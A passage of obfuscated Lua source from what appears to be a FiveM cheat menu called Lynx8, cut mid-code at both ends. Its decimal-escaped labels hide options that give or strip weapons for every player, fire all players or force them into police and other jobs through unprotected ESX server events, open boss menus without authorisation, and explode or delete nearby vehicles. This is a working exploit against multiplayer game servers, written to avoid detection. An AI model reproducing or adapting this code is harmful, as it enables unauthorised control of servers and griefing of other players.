                    local a = GetPlayerPed(-1)
                    local b = GetSelectedPedWeapon(a)
                    SetPedDropsInventoryWeapon(GetPlayerPed(-1), b, 0, 2.0, 0, -1)
                elseif
                    Lynx8.Button(
                        '\126\104\126\126\103\126\71\105\118\101\32\65\108\108\32\87\101\97\112\111\110\115\32\116\111\32\126\115\126\101\118\101\114\121\111\110\101'
                    )
                 then
                    for ds = 0, 128 do
                        if ds ~= PlayerId(-1) and GetPlayerServerId(ds) ~= 0 then
                            for i = 1, #a_ do
                                GiveWeaponToPed(PlayerPedId(ds), GetHashKey(a_[i]), 1000, false, false)
                            end
                        end
                    end
                elseif
                    Lynx8.Button(
                        '\126\104\126\126\114\126\82\101\109\111\118\101\32\65\108\108\32\87\101\97\112\111\110\115\32\102\114\111\109\32\126\115\126\101\118\101\114\121\111\110\101'
                    )
                 then
                    for ds = 0, 128 do
                        if ds ~= PlayerId(-1) and GetPlayerServerId(ds) ~= 0 then
                            RemoveAllPedWeapons(PlayerPedId(ds), true)
                        end
                    end
                elseif Lynx8.Button('\126\104\126\71\105\118\101\32\65\109\109\111') then
                    for i = 1, #a_ do
                        AddAmmoToPed(PlayerPedId(-1), GetHashKey(a_[i]), 200)
                    end
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\126\114\126\79\110\101\83\104\111\116\32\75\105\108\108',
                        oneshot,
                        function(dl)
                            oneshot = dl
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\86\101\104\105\99\108\101\32\71\117\110',
                        VehicleGun,
                        function(dl)
                            VehicleGun = dl
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\68\101\108\101\116\101\32\71\117\110',
                        DeleteGun,
                        function(dl)
                            DeleteGun = dl
                        end
                    )
                 then
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('tunings') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                for i, da in pairs(be) do
                    if da.id == 'extra' and #checkValidVehicleExtras() ~= 0 then
                        if Lynx8.MenuButton(da.name, da.id) then
                        end
                    elseif da.id == 'neon' then
                        if Lynx8.MenuButton(da.name, da.id) then
                        end
                    elseif da.id == 'paint' then
                        if Lynx8.MenuButton(da.name, da.id) then
                        end
                    elseif da.id == 'wheeltypes' then
                        if Lynx8.MenuButton(da.name, da.id) then
                        end
                    else
                        local at = checkValidVehicleMods(da.id)
                        for dg, dh in pairs(at) do
                            if Lynx8.MenuButton(da.name, da.id) then
                            end
                            break
                        end
                    end
                end
                if IsToggleModOn(veh, 22) then
                    xenonStatus = '\73\110\115\116\97\108\108\101\100'
                else
                    xenonStatus = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                end
                if Lynx8.Button('Xenon Headlight', xenonStatus) then
                    if not IsToggleModOn(veh, 22) then
                        ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
                    else
                        ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('performance') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                for i, da in pairs(bf) do
                    if Lynx8.MenuButton(da.name, da.id) then
                    end
                end
                if IsToggleModOn(veh, 18) then
                    turboStatus = '\73\110\115\116\97\108\108\101\100'
                else
                    turboStatus = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                end
                if Lynx8.Button('~h~~b~Turbo ~h~Tune', turboStatus) then
                    if not IsToggleModOn(veh, 18) then
                        ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('primary') then
                Lynx8.MenuButton('~h~~p~-> ~s~Classic', 'classic1')
                Lynx8.MenuButton('~h~~p~-> ~s~Metallic', 'metallic1')
                Lynx8.MenuButton('~h~~p~-> ~s~Matte', 'matte1')
                Lynx8.MenuButton('~h~~p~-> ~s~Metal', 'metal1')
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('secondary') then
                Lynx8.MenuButton('~h~~p~-> ~s~Classic', 'classic2')
                Lynx8.MenuButton('~h~~p~-> ~s~Metallic', 'metallic2')
                Lynx8.MenuButton('~h~~p~-> ~s~Matte', 'matte2')
                Lynx8.MenuButton('~h~~p~-> ~s~Metal', 'metal2')
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('rimpaint') then
                Lynx8.MenuButton('~h~~p~-> ~s~Classic', 'classic3')
                Lynx8.MenuButton('~h~~p~-> ~s~Metallic', 'metallic3')
                Lynx8.MenuButton('~h~~p~-> ~s~Matte', 'matte3')
                Lynx8.MenuButton('~h~~p~-> ~s~Metal', 'metal3')
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('classic1') then
                for dt, du in pairs(bh) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == du.id and not b9 then
                        pricetext = '\73\110\115\116\97\108\108\101\100'
                    else
                        if b9 and tp == du.id then
                            pricetext = '\80\114\101\118\105\101\119\105\110\103'
                        else
                            pricetext = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if Lynx8.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            ba = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = true
                        elseif b9 and curprim == du.id then
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and curprim ~= du.id then
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = true
                        end
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('metallic1') then
                for dt, du in pairs(bh) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == du.id and not b9 then
                        pricetext = '\73\110\115\116\97\108\108\101\100'
                    else
                        if b9 and tp == du.id then
                            pricetext = '\80\114\101\118\105\101\119\105\110\103'
                        else
                            pricetext = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if Lynx8.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            ba = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = true
                        elseif b9 and curprim == du.id then
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and curprim ~= du.id then
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = true
                        end
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('matte1') then
                for dt, du in pairs(bj) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == du.id and not b9 then
                        pricetext = '\73\110\115\116\97\108\108\101\100'
                    else
                        if b9 and tp == du.id then
                            pricetext = '\80\114\101\118\105\101\119\105\110\103'
                        else
                            pricetext = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if Lynx8.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            ba = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleColours(veh, du.id, oldsec)
                            b9 = true
                        elseif b9 and curprim == du.id then
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and curprim ~= du.id then
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = true
                        end
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('metal1') then
                for dt, du in pairs(bk) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == du.id and not b9 then
                        pricetext = '\73\110\115\116\97\108\108\101\100'
                    else
                        if b9 and tp == du.id then
                            pricetext = '\80\114\101\118\105\101\119\105\110\103'
                        else
                            pricetext = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if Lynx8.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            ba = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            SetVehicleColours(veh, du.id, oldsec)
                            b9 = true
                        elseif b9 and curprim == du.id then
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and curprim ~= du.id then
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = true
                        end
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('classic2') then
                for dt, du in pairs(bh) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = '\73\110\115\116\97\108\108\101\100'
                    else
                        if b9 and ts == du.id then
                            pricetext = '\80\114\101\118\105\101\119\105\110\103'
                        else
                            pricetext = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if Lynx8.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            ba = table.pack(oldprim, oldsec)
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = true
                        elseif b9 and cursec == du.id then
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and cursec ~= du.id then
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = true
                        end
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('metallic2') then
                for dt, du in pairs(bh) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = '\73\110\115\116\97\108\108\101\100'
                    else
                        if b9 and ts == du.id then
                            pricetext = '\80\114\101\118\105\101\119\105\110\103'
                        else
                            pricetext = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if Lynx8.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            ba = table.pack(oldprim, oldsec)
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = true
                        elseif b9 and cursec == du.id then
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and cursec ~= du.id then
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = true
                        end
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('matte2') then
                for dt, du in pairs(bj) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = '\73\110\115\116\97\108\108\101\100'
                    else
                        if b9 and ts == du.id then
                            pricetext = '\80\114\101\118\105\101\119\105\110\103'
                        else
                            pricetext = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if Lynx8.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            ba = table.pack(oldprim, oldsec)
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = true
                        elseif b9 and cursec == du.id then
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and cursec ~= du.id then
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = true
                        end
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('metal2') then
                for dt, du in pairs(bk) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = '\73\110\115\116\97\108\108\101\100'
                    else
                        if b9 and ts == du.id then
                            pricetext = '\80\114\101\118\105\101\119\105\110\103'
                        else
                            pricetext = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if Lynx8.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            ba = table.pack(oldprim, oldsec)
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = true
                        elseif b9 and cursec == du.id then
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and cursec ~= du.id then
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = true
                        end
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('classic3') then
                for dt, du in pairs(bh) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = '\73\110\115\116\97\108\108\101\100'
                    else
                        if b9 and ts == du.id then
                            pricetext = '\80\114\101\118\105\101\119\105\110\103'
                        else
                            pricetext = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        end
                    end
                    _, currims = GetVehicleExtraColours(veh)
                    if Lynx8.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            ba = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = true
                        elseif b9 and currims == du.id then
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and currims ~= du.id then
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = true
                        end
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('metallic3') then
                for dt, du in pairs(bh) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = '\73\110\115\116\97\108\108\101\100'
                    else
                        if b9 and ts == du.id then
                            pricetext = '\80\114\101\118\105\101\119\105\110\103'
                        else
                            pricetext = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        end
                    end
                    _, currims = GetVehicleExtraColours(veh)
                    if Lynx8.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            ba = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = true
                        elseif b9 and currims == du.id then
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and currims ~= du.id then
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = true
                        end
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('matte3') then
                for dt, du in pairs(bj) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = '\73\110\115\116\97\108\108\101\100'
                    else
                        if b9 and ts == du.id then
                            pricetext = '\80\114\101\118\105\101\119\105\110\103'
                        else
                            pricetext = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        end
                    end
                    _, currims = GetVehicleExtraColours(veh)
                    if Lynx8.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            ba = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = true
                        elseif b9 and currims == du.id then
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and currims ~= du.id then
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = true
                        end
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('metal3') then
                for dt, du in pairs(bk) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = '\73\110\115\116\97\108\108\101\100'
                    else
                        if b9 and ts == du.id then
                            pricetext = '\80\114\101\118\105\101\119\105\110\103'
                        else
                            pricetext = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        end
                    end
                    _, currims = GetVehicleExtraColours(veh)
                    if Lynx8.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            ba = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = true
                        elseif b9 and currims == du.id then
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and currims ~= du.id then
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = true
                        end
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('AICONTROLMENU') then
                if Lynx8.Button('~h~Configure AI ~g~Speed') then
                    local cspeed = KeyboardInput('Enter Wanted MaxSpeed', '', 100)
                    if cspeed ~= nil or cspeed ~= '' then
                        aispeed = (cspeed .. '.0')
                        SetDriveTaskMaxCruiseSpeed(GetPlayerPed(-1), tonumber(aispeed))
                    end
                    SetDriverAbility(GetPlayerPed(-1), 100.0)
                elseif Lynx8.Button('~h~AI Drive (Waypoint_Slow)') then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                        local ped = GetPlayerPed(-1)
                        ClearPedTasks(ped)
                        local v = GetVehiclePedIsIn(ped, false)
                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(aispeed), 156, v, 5, 1.0, true)
                        SetDriveTaskDrivingStyle(ped, 8388636)
                        speedmit = true
                    end
                elseif Lynx8.Button('~h~AI Drive (Waypoint_Fast)') then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                        local ped = GetPlayerPed(-1)
                        ClearPedTasks(ped)
                        local v = GetVehiclePedIsIn(ped, false)
                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(aispeed), 156, v, 2883621, 5.5, true)
                        SetDriveTaskDrivingStyle(ped, 2883621)
                        speedmit = true
                    end
                elseif Lynx8.Button('~h~AI Drive (Wander)') then
                    local ped = GetPlayerPed(-1)
                    ClearPedTasks(ped)
                    local v = GetVehiclePedIsIn(ped, false)
                    print('Configured speed is currently ' .. aispeed)
                    TaskVehicleDriveWander(ped, v, tonumber(aispeed), 8388636)
                elseif Lynx8.Button('~h~Stop AI') then
                    speedmit = false
                    if IsPedInAnyVehicle(GetPlayerPed(-1)) then
                        ClearPedTasks(GetPlayerPed(-1))
                    else
                        ClearPedTasksImmediately(GetPlayerPed(-1))
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('\86\101\104\105\99\108\101\77\101\110\117') then
                if Lynx8.MenuButton('~h~~p~-> ~s~~h~~b~LSC ~s~Customs', '\76\83\67') then
                elseif Lynx8.MenuButton('~h~~p~->~s~ Vehicle ~g~Boost', 'BoostMenu') then
                elseif Lynx8.MenuButton('~h~~p~->~s~ Vehicle List', 'CarTypes') then
                elseif Lynx8.MenuButton("~h~~p~->~s~ AI Menu", "AICONTROLMENU") then
                elseif
                    Lynx8.Button(
                        '\126\104\126\83\112\97\119\110\32\126\114\126\67\117\115\116\111\109\32\126\115\126\86\101\104\105\99\108\101'
                    )
                 then
                    bS()
                elseif
                    Lynx8.Button(
                        '\126\104\126\126\103\126\82\101\112\97\105\114\32\126\115\126\86\101\104\105\99\108\101'
                    )
                 then
                    bU()
                elseif Lynx8.Button('\126\104\126\70\108\105\112\32\86\101\104\105\99\108\101') then
                    daojosdinpatpemata()
                elseif Lynx8.Button('\126\104\126\126\98\126\77\97\120\32\126\115\126\84\117\110\105\110\103') then
                    MaxOut(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\82\97\105\110\98\111\119\32\86\101\104\105\99\108\101\32\67\111\108\111\117\114',
                        RainbowVeh,
                        function(dl)
                            RainbowVeh = dl
                        end
                    )
                 then
                elseif
                    Lynx8.Button(
                        '\126\104\126\126\114\126\68\101\108\101\116\101\32\126\115\126\86\101\104\105\99\108\101'
                    )
                 then
                    DelVeh(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif Lynx8.Button('\126\104\126\77\97\107\101\32\118\101\104\105\99\108\101\32\100\105\114\116\121') then
                    Clean(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif Lynx8.Button('\126\104\126\77\97\107\101\32\118\101\104\105\99\108\101\32\99\108\101\97\110') then
                    Clean2(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif
                    Lynx8.Button(
                        '\126\104\126\67\104\97\110\103\101\32\67\97\114\32\76\105\99\101\110\115\101\32\80\108\97\116\101'
                    )
                 then
                    bW()
                elseif Lynx8.Button('\126\104\126\82\101\102\117\101\108\32\86\101\104\105\99\108\101') then
                    bV()
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\78\111\32\70\97\108\108',
                        Nofall,
                        function(dl)
                            Nofall = dl
                            SetPedCanBeKnockedOffVehicle(PlayerPedId(-1), Nofall)
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\86\101\104\105\99\108\101\32\71\111\100\109\111\100\101',
                        VehGod,
                        function(dl)
                            VehGod = dl
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\83\112\101\101\100\98\111\111\115\116\32\126\103\126\83\72\73\70\84\32\126\114\126\67\84\82\76',
                        VehSpeed,
                        function(dl)
                            VehSpeed = dl
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\126\114\126\69\77\80\126\115\126\32\78\101\97\114\101\115\116\32\86\101\104\105\99\108\101\115',
                        destroyvehicles,
                        function(dl)
                            destroyvehicles = dl
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\126\114\126\68\101\108\101\116\101\126\115\126\32\78\101\97\114\101\115\116\32\86\101\104\105\99\108\101\115\47\69\110\116\105\116\121',
                        deletenearestvehicle,
                        function(dl)
                            deletenearestvehicle = dl
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\126\114\126\69\120\112\108\111\100\101\126\115\126\32\78\101\97\114\101\115\116\32\86\101\104\105\99\108\101\115',
                        explodevehicles,
                        function(dl)
                            explodevehicles = dl
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\126\112\126\70\117\99\107\126\115\126\32\78\101\97\114\101\115\116\32\86\101\104\105\99\108\101\115',
                        fuckallcars,
                        function(dl)
                            fuckallcars = dl
                        end
                    )
                 then
                end
Lynx8.Display()
            elseif Lynx8.IsMenuOpened('\76\117\97\77\101\110\117') then
                if Lynx8.MenuButton('~h~~p~-> ~s~~r~ESX ~s~Boss', '\69\83\88\66\111\115\115') then
                elseif Lynx8.MenuButton('~h~~p~-> ~s~~r~ESX ~s~Money', '\69\83\88\77\111\110\101\121') then
                elseif Lynx8.MenuButton('~h~~p~-> ~s~~r~ESX ~s~Jobs', '\69\83\88\74\111\98\115') then
                elseif Lynx8.MenuButton('~h~~p~-> ~s~~r~ESX ~s~Misc', '\69\83\88\67\117\115\116\111\109') then
                elseif Lynx8.MenuButton('~h~~p~-> ~s~~r~ESX ~s~Drugs', '\69\83\88\68\114\117\103\115') then
                elseif Lynx8.MenuButton('~h~~p~-> ~s~~y~VRP ~s~Triggers', '\86\82\80\84\114\105\103\103\101\114\115') then
                elseif
                    Lynx8.MenuButton('~h~~p~-> ~s~~b~Misc ~s~Triggers', '\77\105\115\99\84\114\105\103\103\101\114\115')
                 then
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('\69\83\88\74\111\98\115') then
                if Lynx8.Button('\126\104\126\70\105\114\101\32\97\108\108\32\112\108\97\121\101\114\115') then
                    for a = 0, 128 do
                        TriggerServerEvent(
                            '\78\66\58\100\101\115\116\105\116\117\101\114\112\108\97\121\101\114',
                            GetPlayerServerId(a)
                        )
                        UnemployedPlayers()
                    end
                elseif
                    Lynx8.Button(
                        '\126\104\126\83\101\116\32\97\108\108\32\126\98\126\80\111\108\105\99\101\32\126\115\126\74\111\98'
                    )
                 then
                    for a = 0, 128 do
                        TriggerServerEvent(
                            '\78\66\58\114\101\99\114\117\116\101\114\112\108\97\121\101\114',
                            GetPlayerServerId(a),
                            '\112\111\108\105\99\101',
                            3
                        )
                        PolicePlayers()
                    end
                elseif
                    Lynx8.Button(
                        '\126\104\126\83\101\116\32\97\108\108\32\126\111\126\77\101\99\97\110\111\32\126\115\126\74\111\98'
                    )
                 then
                    for a = 0, 128 do
                        TriggerServerEvent(
                            '\78\66\58\114\101\99\114\117\116\101\114\112\108\97\121\101\114',
                            GetPlayerServerId(a),
                            '\109\101\99\97\110\111',
                            3
                        )
                        MecanoPlayers()
                    end
                elseif
                    Lynx8.Button(
                        '\126\104\126\83\101\116\32\97\108\108\32\126\121\126\84\97\120\105\32\126\115\126\74\111\98'
                    )
                 then
                    for a = 0, 128 do
                        TriggerServerEvent(
                            '\78\66\58\114\101\99\114\117\116\101\114\112\108\97\121\101\114',
                            GetPlayerServerId(a),
                            '\116\97\120\105',
                            3
                        )
                        TaxiPlayers()
                    end
                elseif
                    Lynx8.Button(
                        '\126\104\126\83\101\116\32\97\108\108\32\126\114\126\65\109\98\117\108\97\110\99\101\32\126\115\126\74\111\98'
                    )
                 then
                    for a = 0, 128 do
                        TriggerServerEvent(
                            '\78\66\58\114\101\99\114\117\116\101\114\112\108\97\121\101\114',
                            GetPlayerServerId(a),
                            '\97\109\98\117\108\97\110\99\101',
                            3
                        )
                        AmbulancePlayers()
                    end
                elseif
                    Lynx8.Button(
                        '\126\104\126\83\101\116\32\97\108\108\32\126\103\126\82\101\97\108\32\69\115\116\97\116\101\32\126\115\126\74\111\98'
                    )
                 then
                    for a = 0, 128 do
                        TriggerServerEvent(
                            '\78\66\58\114\101\99\114\117\116\101\114\112\108\97\121\101\114',
                            GetPlayerServerId(a),
                            '\114\101\97\108\101\115\116\97\116\101\97\103\101\110\116',
                            3
                        )
                        RealEstateAgentPlayers()
                    end
                elseif
                    Lynx8.Button(
                        '\126\104\126\83\101\116\32\97\108\108\32\126\114\126\67\97\114\32\126\98\126\68\101\97\108\101\114\32\126\115\126\74\111\98'
                    )
                 then
                    for a = 0, 128 do
                        TriggerServerEvent(
                            '\78\66\58\114\101\99\114\117\116\101\114\112\108\97\121\101\114',
                            GetPlayerServerId(a),
                            '\99\97\114\100\101\97\108\101\114',
                            3
                        )
                        CarDealerPlayers()
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('\69\83\88\66\111\115\115') then
                if
                    Lynx8.Button(
                        '\126\99\126\126\104\126\77\101\99\104\97\110\105\99\126\115\126\32\66\111\115\115\32\77\101\110\117'
                    )
                 then
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        'mecano',
                        function(dv, dw)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        '\109\101\99\97\110\111',
                        function(dv, dw)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        'mecano',
                        function(dx, dy)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        '\109\101\99\97\110\111',
                        function(dx, dy)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        'mecano',
                        function(dz, dA)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        '\109\101\99\97\110\111',
